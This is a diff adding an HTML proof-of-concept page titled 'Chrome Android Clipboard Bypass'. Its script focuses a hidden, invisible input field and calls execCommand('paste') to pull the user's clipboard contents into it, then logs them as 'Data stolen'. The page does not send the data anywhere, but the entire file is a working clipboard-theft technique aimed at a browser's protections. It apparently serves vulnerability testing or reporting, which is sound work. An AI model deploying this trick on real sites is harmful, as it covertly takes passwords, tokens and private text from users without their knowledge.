@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chrome Android Clipboard Bypass</title>
+    <style>
+        body { font-family: monospace; padding: 20px; line-height: 1.5; }
+        #log { margin-top: 20px; border-top: 1px solid #000; padding-top: 10px; }
+        button { padding: 10px; cursor: pointer; }
+        #trap { position: absolute; opacity: 0; z-index: -1; }
+    </style>
+</head>
+<body>
+
+    <h3>Legacy Clipboard Read (Chrome Android)</h3>
+    <button id="stealBtn">READ CLIPBOARD</button>
+    
+    <input type="text" id="trap">
+
+    <div id="log">
+        <strong>Activity Log:</strong><br>
+    </div>
+
+    <script>
+        const btn = document.getElementById("stealBtn");
+        const logDiv = document.getElementById("log");
+        const trap = document.getElementById("trap");
+
+        btn.addEventListener("click", (e) => {
+            logDiv.innerHTML += `> Button clicked. isTrusted: ${e.isTrusted}<br>`;
+            
+            trap.focus();
+
+            try {
+                const success = document.execCommand('paste');
+                
+                if (success) {
+                    const stolenText = trap.value;
+                    logDiv.innerHTML += `> SUCCESS: Data stolen -> "${stolenText}"<br>`;
+                } else {
+                    logDiv.innerHTML += `> FAILED: execCommand returned false.<br>`;
+                }
+            } catch (err) {
+                logDiv.innerHTML += `> BLOCKED: ${err.message}<br>`;
+            }
+        });
+    </script>
+
+</body>
+</html>
